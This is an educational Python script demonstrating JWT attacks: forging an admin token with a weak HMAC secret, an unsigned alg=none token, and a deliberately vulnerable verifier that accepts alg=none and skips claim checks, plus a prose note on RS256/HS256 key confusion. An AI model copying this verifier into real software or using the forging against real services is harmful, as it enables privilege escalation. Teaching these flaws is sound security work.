#!/usr/bin/env python3
"""
jwt_attack_demo.py

Purpose:
 - Demonstrate common JWT vulnerabilities and a simple PoC for forging a token
   using a weak HMAC secret and an alg=none attack simulation.
 - This script is educational. Do NOT run against systems you do not own.

Files included in this deliverable:
 - jwt_attack_demo.py  (this file)
 - report.pdf          (research report)
 - README.md           (setup & testing instructions)

Author: Generated for user
"""

import base64
import json
import hmac
import hashlib

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def b64url_decode(s: str) -> bytes:
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s.encode("ascii"))

def sign_hs256(header_b64: str, payload_b64: str, secret: bytes) -> str:
    signing_input = (header_b64 + "." + payload_b64).encode("ascii")
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return b64url_encode(sig)

def create_hs256_token(payload: dict, secret: str) -> str:
    header = {"alg":"HS256","typ":"JWT"}
    header_b64 = b64url_encode(json.dumps(header,separators=(',',':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload,separators=(',',':')).encode())
    signature = sign_hs256(header_b64, payload_b64, secret.encode())
    return header_b64 + "." + payload_b64 + "." + signature

def create_none_token(payload: dict) -> str:
    # alg=none token: no signature
    header = {"alg":"none","typ":"JWT"}
    header_b64 = b64url_encode(json.dumps(header,separators=(',',':')).encode())
    payload_b64 = b64url_encode(json.dumps(payload,separators=(',',':')).encode())
    return header_b64 + "." + payload_b64 + "."  # empty signature

def naive_verify(token: str, expected_secret: str, allow_alg_none=False) -> bool:
    """
    A deliberately-vulnerable verification function that demonstrates common mistakes:
     - accepting alg=none when allow_alg_none=True
     - using a weak secret
     - not validating token claims (exp, nbf, aud, iss)
    """
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Token format invalid")
        return False
    header_b64, payload_b64, signature_b64 = parts
    try:
        header = json.loads(b64url_decode(header_b64).decode('utf-8'))
        payload = json.loads(b64url_decode(payload_b64).decode('utf-8'))
    except Exception as e:
        print("[!] Failed to decode token:", e)
        return False

    alg = header.get("alg","")
    print(f"[+] Token header alg: {alg}")
    if alg.lower() == "none":
        if allow_alg_none:
            print("[!] Accepting alg=none (vulnerable) -> treating token as valid without checking signature")
            return True
        else:
            print("[!] alg=none present but not allowed by verifier")
            return False

    # Only supports HS256 for demo
    if alg.upper() == "HS256":
        expected_sig = sign_hs256(header_b64, payload_b64, expected_secret.encode())
        # NOTE: naive comparison without constant-time check - demonstration only
        if expected_sig == signature_b64:
            print("[+] Signature valid (HS256)")
            return True
        else:
            print("[!] Signature invalid (HS256)")
            return False

    print("[!] Unsupported algorithm:", alg)
    return False

def demo():
    print("=== JWT Security Demo ===")
    # 1) Weak secret forging demo
    weak_secret = "secret"  # intentionally weak
    strong_secret = "S0m3_very_str0ng_secret_that_is_not_guessable"

    # Victim service uses weak_secret to sign tokens (bad practice)
    victim_payload = {"sub":"user123","role":"user"}
    victim_token = create_hs256_token(victim_payload, weak_secret)
    print("\n[Step 1] Victim-issued token (signed with weak secret):\n", victim_token)

    # Attacker forges token by creating new payload with admin privileges
    forged_payload = {"sub":"user123","role":"admin"}
    forged_token = create_hs256_token(forged_payload, weak_secret)
    print("\n[Step 2] Attacker-forged token using same weak secret:\n", forged_token)

    # Verification by vulnerable verifier (which uses weak secret)
    print("\n[Step 3] Verification of forged token by vulnerable verifier (weak secret):")
    naive_verify(forged_token, weak_secret, allow_alg_none=False)

    # 2) alg=none demonstration
    alg_none_payload = {"sub":"attacker","role":"admin"}
    alg_none_token = create_none_token(alg_none_payload)
    print("\n[Step 4] alg=none forged token (no signature):\n", alg_none_token)
    print("\n[Step 5] Verification of alg=none token by a verifier that allows alg=none:")
    naive_verify(alg_none_token, weak_secret, allow_alg_none=True)

    # 3) Key confusion note (not executable here): describe how attacker can use RSA public key as HMAC key.
    print("\n[Step 6] Key confusion: if an application allows switching alg between RS256 and HS256,")
    print("         attacker can set alg=HS256 and use the server's public RSA key as HMAC key to forge tokens.")

if __name__ == "__main__":
    demo()
